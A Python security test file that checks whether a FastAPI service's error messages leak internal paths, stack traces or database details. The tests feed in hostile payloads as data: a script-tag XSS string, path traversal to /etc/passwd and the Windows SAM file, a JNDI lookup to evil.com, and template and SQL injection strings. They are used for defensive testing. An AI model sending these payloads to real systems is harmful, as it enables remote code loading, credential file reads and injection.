# Copyright 2026 Dell Inc. or its subsidiaries. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Security tests for error message sanitization."""

import json
import uuid
from fastapi.testclient import TestClient

from main import app


class TestErrorSanitizationSecurity:
    """Security tests for error message sanitization."""

    def setup_method(self) -> None:
        """Set up test client."""
        self.client = TestClient(app)
        self.job_id = str(uuid.uuid4())
        self.correlation_id = str(uuid.uuid4())
        self.headers = {
            "Authorization": "Bearer valid-test-token",
            "X-Correlation-ID": self.correlation_id,
        }

    def test_parse_catalog_error_sanitization(self) -> None:
        """Test that parse catalog errors are properly sanitized."""
        # Test with various malformed inputs that could leak internal details
        malicious_inputs = [
            b'{"Catalog": {"Name": "<script>alert(\'xss\')</script>"}}',
            b'{"Catalog": {"Name": "../../../etc/passwd"}}',
            b'{"Catalog": {"Name": "test\x00\x01\x02"}}',
            b'{"Catalog": {"Name": "${jndi:ldap://evil.com/a}"}}',
            b'{"Catalog": {"Name": "{{7*7}}"}}',
            b'{"Catalog": {"Name": "test\' OR 1=1 --"}}',
        ]

        for malicious_input in malicious_inputs:
            response = self.client.post(
                f"/api/v1/jobs/{self.job_id}/stages/parse-catalog",
                files={"catalog": ("catalog.json", malicious_input, "application/json")},
                headers=self.headers,
            )

            # Should handle malicious input safely
            assert response.status_code in [400, 422, 500]
            
            # Response should not contain the malicious content
            response_text = response.text.lower()
            
            # Check for XSS patterns
            assert "<script>" not in response_text
            assert "javascript:" not in response_text
            
            # Check for path traversal patterns
            assert "etc/passwd" not in response_text
            assert "windows" not in response_text
            
            # Check for injection patterns
            assert "jndi:" not in response_text
            assert "{{" not in response_text
            assert "or 1=1" not in response_text

    def test_generate_input_files_error_sanitization(self) -> None:
        """Test that generate input files errors are properly sanitized."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "test' OR 1=1 --",
        ]

        for malicious_path in malicious_paths:
            request_data = {"adapter_policy_path": malicious_path}
            
            response = self.client.post(
                f"/api/v1/jobs/{self.job_id}/stages/generate-input-files",
                json=request_data,
                headers=self.headers,
            )

            # Should handle malicious input safely
            assert response.status_code in [400, 422, 500]
            
            # Response should not contain the malicious content
            response_text = response.text.lower()
            
            # Check for various injection patterns
            assert "etc/passwd" not in response_text
            assert "windows" not in response_text
            assert "jndi:" not in response_text
            assert "{{" not in response_text
            assert "or 1=1" not in response_text

    def test_database_error_sanitization(self) -> None:
        """Test that database errors are sanitized."""
        # This test simulates database connection issues
        # The actual error handling may vary based on implementation
        
        headers = {
            "Authorization": "Bearer non-existent-db-token",
            "X-Correlation-ID": str(uuid.uuid4()),
        }

        catalog_content = json.dumps({"Catalog": {"Name": "Test"}}).encode('utf-8')

        response = self.client.post(
            f"/api/v1/jobs/{self.job_id}/stages/parse-catalog",
            files={"catalog": ("catalog.json", catalog_content, "application/json")},
            headers=headers,
        )

        # Should not expose database details
        response_text = response.text.lower()
        
        db_patterns = [
            "database",
            "connection",
            "sql",
            "mysql",
            "postgresql",
            "sqlite",
            "table",
            "column",
            "schema",
            "constraint",
            "foreign key",
        ]

        for pattern in db_patterns:
            # Database errors should be sanitized
            if response.status_code >= 500:
                assert pattern not in response_text or "error" in response_text

    def test_filesystem_error_sanitization(self) -> None:
        """Test that filesystem errors are sanitized."""
        # Test with paths that might trigger filesystem errors
        filesystem_paths = [
            "/nonexistent/path/policy.json",
            "/dev/null/policy.json",
            "/proc/version",
            "/sys/kernel/version",
        ]

        for fs_path in filesystem_paths:
            request_data = {"adapter_policy_path": fs_path}
            
            response = self.client.post(
                f"/api/v1/jobs/{self.job_id}/stages/generate-input-files",
                json=request_data,
                headers=self.headers,
            )

            # Should not expose filesystem details
            response_text = response.text.lower()
            
            fs_patterns = [
                "/nonexistent",
                "/dev/null",
                "/proc/",
                "/sys/",
                "permission denied",
                "no such file",
                "not a directory",
                "read-only",
            ]

            for pattern in fs_patterns:
                if response.status_code >= 400:
                    assert pattern not in response_text or "error" in response_text

    def test_stack_trace_sanitization(self) -> None:
        """Test that stack traces are not exposed."""
        # Trigger various error conditions
        error_conditions = [
            # Invalid JSON
            b'{"invalid": json}',
            # Oversized file
            b'x' * (10 * 1024 * 1024),
            # Malformed catalog
            b'{"NotACatalog": {"data": "test"}}',
        ]

        for error_input in error_conditions:
            response = self.client.post(
                f"/api/v1/jobs/{self.job_id}/stages/parse-catalog",
                files={"catalog": ("catalog.json", error_input, "application/json")},
                headers=self.headers,
            )

            # Should not expose stack traces
            response_text = response.text.lower()
            
            stack_trace_patterns = [
                "traceback",
                "stack trace",
                "python",
                ".py:",
                "line ",
                "in ",
                "function ",
                "exception ",
                "error at line",
            ]

            for pattern in stack_trace_patterns:
                assert pattern not in response_text

    def test_internal_path_sanitization(self) -> None:
        """Test that internal paths are not exposed."""
        response = self.client.post(
            f"/api/v1/jobs/{self.job_id}/stages/generate-input-files",
            json={"adapter_policy_path": "/nonexistent/path.json"},
            headers=self.headers,
        )

        # Should not expose internal application paths
        response_text = response.text.lower()
        
        internal_patterns = [
            "/opt/omnia",
            "/app/",
            "/usr/local/",
            "build_stream",
            "python",
            "site-packages",
            "__pycache__",
        ]

        for pattern in internal_patterns:
            assert pattern not in response_text

    def test_error_code_consistency(self) -> None:
        """Test that error codes are consistent and don't leak information."""
        # Test various error conditions
        test_cases = [
            # Invalid auth
            {"headers": {"Authorization": "Bearer invalid"}},
            # Invalid correlation ID
            {"headers": {"X-Correlation-ID": "invalid"}},
            # Invalid job ID
            {"job_id": "invalid-uuid"},
        ]

        for test_case in test_cases:
            headers = self.headers.copy()
            if "headers" in test_case:
                headers.update(test_case["headers"])
            
            job_id = test_case.get("job_id", self.job_id)
            
            response = self.client.post(
                f"/api/v1/jobs/{job_id}/stages/parse-catalog",
                files={"catalog": ("catalog.json", b'{}', "application/json")},
                headers=headers,
            )

            # Should return appropriate error codes
            assert response.status_code in [400, 401, 422]
            
            # Error response should be structured
            if response.status_code >= 400:
                response_data = response.json()
                assert "detail" in response_data or "message" in response_data

    def test_correlation_id_in_errors(self) -> None:
        """Test that correlation IDs are included in error responses."""
        headers = {
            "Authorization": "Bearer invalid-token",
            "X-Correlation-ID": self.correlation_id,
        }

        response = self.client.post(
            f"/api/v1/jobs/{self.job_id}/stages/parse-catalog",
            files={"catalog": ("catalog.json", b'{}', "application/json")},
            headers=headers,
        )

        # Error responses should include correlation ID for tracing
        if response.status_code >= 400:
            response_text = response.text
            # Correlation ID should be present for debugging (but not sensitive data)
            assert self.correlation_id in response_text or "correlation" in response_text.lower()
